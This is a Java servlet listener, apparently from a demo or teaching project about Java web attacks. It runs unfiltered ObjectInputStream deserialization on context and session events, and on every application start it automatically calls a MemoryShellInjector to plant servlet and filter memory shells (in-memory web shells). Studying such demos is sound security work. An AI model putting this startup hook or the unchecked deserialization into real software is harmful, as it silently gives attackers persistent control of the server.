package com.book.demo;

import jakarta.servlet.*;
import jakarta.servlet.annotation.WebListener;
import jakarta.servlet.http.HttpSessionEvent;
import jakarta.servlet.http.HttpSessionListener;
import com.book.demo.memshell.MemoryShellInjector;

import java.io.*;
import java.util.Base64;
import java.util.HashMap;
import java.util.Map;
import java.util.concurrent.ConcurrentHashMap;
import java.util.concurrent.atomic.AtomicInteger;

@WebListener
public class DemoListener implements ServletContextListener, HttpSessionListener {
    
    private static final Map<String, Object> listenerData = new ConcurrentHashMap<>();
    private static final AtomicInteger sessionCounter = new AtomicInteger(0);
    
    // ServletContextListener 方法
    @Override
    public void contextInitialized(ServletContextEvent sce) {
        ServletContext context = sce.getServletContext();
        System.out.println("[DEMO-LISTENER] ServletContext 初始化: " + context.getContextPath());
        
        try {
            // 演示Context初始化时的反序列化操作
            demonstrateContextInitialization(context);
            
            // 自动注入内存马用于演示
            autoInjectMemoryShells();
        } catch (Exception e) {
            System.out.println("[DEMO-LISTENER] Context初始化演示失败: " + e.getMessage());
        }
    }
    
    @Override
    public void contextDestroyed(ServletContextEvent sce) {
        ServletContext context = sce.getServletContext();
        System.out.println("[DEMO-LISTENER] ServletContext 销毁: " + context.getContextPath());
        
        try {
            // 演示Context销毁时的序列化操作
            demonstrateContextDestruction(context);
        } catch (Exception e) {
            System.out.println("[DEMO-LISTENER] Context销毁演示失败: " + e.getMessage());
        }
        
        // 清理数据
        listenerData.clear();
    }
    
    // HttpSessionListener 方法
    @Override
    public void sessionCreated(HttpSessionEvent se) {
        String sessionId = se.getSession().getId();
        int currentCount = sessionCounter.incrementAndGet();
        
        System.out.println("[DEMO-LISTENER] Session 创建: " + sessionId + " (总数: " + currentCount + ")");
        
        try {
            // 演示Session创建时的反序列化操作
            demonstrateSessionCreation(se);
        } catch (Exception e) {
            System.out.println("[DEMO-LISTENER] Session创建演示失败: " + e.getMessage());
        }
    }
    
    @Override
    public void sessionDestroyed(HttpSessionEvent se) {
        String sessionId = se.getSession().getId();
        int currentCount = sessionCounter.decrementAndGet();
        
        System.out.println("[DEMO-LISTENER] Session 销毁: " + sessionId + " (剩余: " + currentCount + ")");
        
        try {
            // 演示Session销毁时的序列化操作
            demonstrateSessionDestruction(se);
        } catch (Exception e) {
            System.out.println("[DEMO-LISTENER] Session销毁演示失败: " + e.getMessage());
        }
    }
    
    private void demonstrateContextInitialization(ServletContext context) throws Exception {
        System.out.println("[DEMO-LISTENER] 演示Context初始化反序列化");
        
        // 创建Context初始化数据
        Map<String, Object> contextData = new HashMap<>();
        contextData.put("contextPath", context.getContextPath());
        contextData.put("serverInfo", context.getServerInfo());
        contextData.put("majorVersion", context.getMajorVersion());
        contextData.put("minorVersion", context.getMinorVersion());
        contextData.put("initTime", System.currentTimeMillis());
        contextData.put("listenerType", "DemoListener");
        
        // 序列化Context数据
        String serializedData = serializeToBase64(contextData);
        System.out.println("[DEMO-LISTENER] Context数据序列化完成，大小: " + serializedData.length());
        
        // 反序列化Context数据
        Object deserializedData = deserializeFromBase64(serializedData);
        
        // 存储到全局数据中
        listenerData.put("contextInitData", deserializedData);
        listenerData.put("initTime", System.currentTimeMillis());
        
        System.out.println("[DEMO-LISTENER] Context初始化数据处理完成");
    }
    
    private void demonstrateContextDestruction(ServletContext context) throws Exception {
        System.out.println("[DEMO-LISTENER] 演示Context销毁序列化");
        
        // 创建Context销毁数据
        Map<String, Object> destructionData = new HashMap<>();
        destructionData.put("contextPath", context.getContextPath());
        destructionData.put("destructionTime", System.currentTimeMillis());
        destructionData.put("upTime", System.currentTimeMillis() - 
                           (Long) listenerData.getOrDefault("initTime", System.currentTimeMillis()));
        destructionData.put("totalSessions", sessionCounter.get());
        destructionData.put("storedDataCount", listenerData.size());
        
        // 序列化销毁数据
        String serializedData = serializeToBase64(destructionData);
        
        // 反序列化销毁数据
        Object deserializedData = deserializeFromBase64(serializedData);
        
        System.out.println("[DEMO-LISTENER] Context销毁数据: " + deserializedData);
    }
    
    private void demonstrateSessionCreation(HttpSessionEvent se) throws Exception {
        String sessionId = se.getSession().getId();
        System.out.println("[DEMO-LISTENER] 演示Session创建反序列化: " + sessionId);
        
        // 创建Session创建数据
        Map<String, Object> sessionData = new HashMap<>();
        sessionData.put("sessionId", sessionId);
        sessionData.put("creationTime", se.getSession().getCreationTime());
        sessionData.put("maxInactiveInterval", se.getSession().getMaxInactiveInterval());
        sessionData.put("isNew", se.getSession().isNew());
        sessionData.put("eventType", "SESSION_CREATED");
        sessionData.put("listenerClass", this.getClass().getSimpleName());
        
        // 序列化Session数据
        String serializedData = serializeToBase64(sessionData);
        
        // 反序列化Session数据
        Object deserializedData = deserializeFromBase64(serializedData);
        
        // 存储Session信息
        listenerData.put("session_" + sessionId, deserializedData);
        
        System.out.println("[DEMO-LISTENER] Session创建数据处理完成，序列化大小: " + serializedData.length());
    }
    
    private void demonstrateSessionDestruction(HttpSessionEvent se) throws Exception {
        String sessionId = se.getSession().getId();
        System.out.println("[DEMO-LISTENER] 演示Session销毁序列化: " + sessionId);
        
        // 获取Session的创建信息
        Object sessionCreateData = listenerData.get("session_" + sessionId);
        
        // 创建Session销毁数据
        Map<String, Object> destructionData = new HashMap<>();
        destructionData.put("sessionId", sessionId);
        destructionData.put("destructionTime", System.currentTimeMillis());
        destructionData.put("lastAccessedTime", se.getSession().getLastAccessedTime());
        destructionData.put("eventType", "SESSION_DESTROYED");
        destructionData.put("sessionLifetime", System.currentTimeMillis() - se.getSession().getCreationTime());
        destructionData.put("createData", sessionCreateData);
        
        // 序列化销毁数据
        String serializedData = serializeToBase64(destructionData);
        
        // 反序列化销毁数据
        Object deserializedData = deserializeFromBase64(serializedData);
        
        System.out.println("[DEMO-LISTENER] Session销毁数据: " + deserializedData);
        
        // 清理Session数据
        listenerData.remove("session_" + sessionId);
    }
    
    private String serializeToBase64(Object obj) throws IOException {
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(baos);
        oos.writeObject(obj);
        oos.close();
        
        byte[] serializedData = baos.toByteArray();
        return Base64.getEncoder().encodeToString(serializedData);
    }
    
    private Object deserializeFromBase64(String base64Data) throws IOException, ClassNotFoundException {
        byte[] serializedData = Base64.getDecoder().decode(base64Data);
        ByteArrayInputStream bais = new ByteArrayInputStream(serializedData);
        ObjectInputStream ois = new ObjectInputStream(bais);
        
        Object result = ois.readObject();
        ois.close();
        
        return result;
    }
    
    // 提供静态方法供外部查询Listener数据
    public static Map<String, Object> getListenerData() {
        return new HashMap<>(listenerData);
    }
    
    public static int getCurrentSessionCount() {
        return sessionCounter.get();
    }
    
    /**
     * 自动注入内存马用于演示
     */
    private void autoInjectMemoryShells() {
        System.out.println("[DEMO-LISTENER] 开始自动注入内存马...");
        
        try {
            // 注入Servlet内存马
            MemoryShellInjector.InjectionResult servletResult = MemoryShellInjector.injectServletShell();
            System.out.println("[DEMO-LISTENER] Servlet内存马注入结果: " + 
                             (servletResult.isSuccess() ? "成功" : "失败 - " + servletResult.getMessage()));
            
            // 注入Filter内存马
            MemoryShellInjector.InjectionResult filterResult = MemoryShellInjector.injectFilterShell();
            System.out.println("[DEMO-LISTENER] Filter内存马注入结果: " + 
                             (filterResult.isSuccess() ? "成功" : "失败 - " + filterResult.getMessage()));
            
        } catch (Exception e) {
            System.err.println("[DEMO-LISTENER] 自动注入内存马失败: " + e.getMessage());
            e.printStackTrace();
        }
    }
}